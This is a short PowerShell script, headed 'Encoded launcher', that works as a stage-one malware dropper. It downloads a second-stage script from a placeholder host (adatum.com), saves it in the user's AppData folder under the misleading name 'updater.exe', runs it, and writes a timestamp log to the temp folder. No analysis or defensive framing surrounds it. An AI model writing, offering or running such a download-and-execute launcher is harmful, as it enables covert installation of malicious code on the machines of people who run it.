# Encoded launcher
$Stage2Url = "https://adatum.com:443/stage2.ps1"
$LocalPath = "$env:APPDATA\updater.exe"
Invoke-WebRequest -Uri $Stage2Url -OutFile $LocalPath -UseBasicParsing
Start-Process -FilePath $LocalPath
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
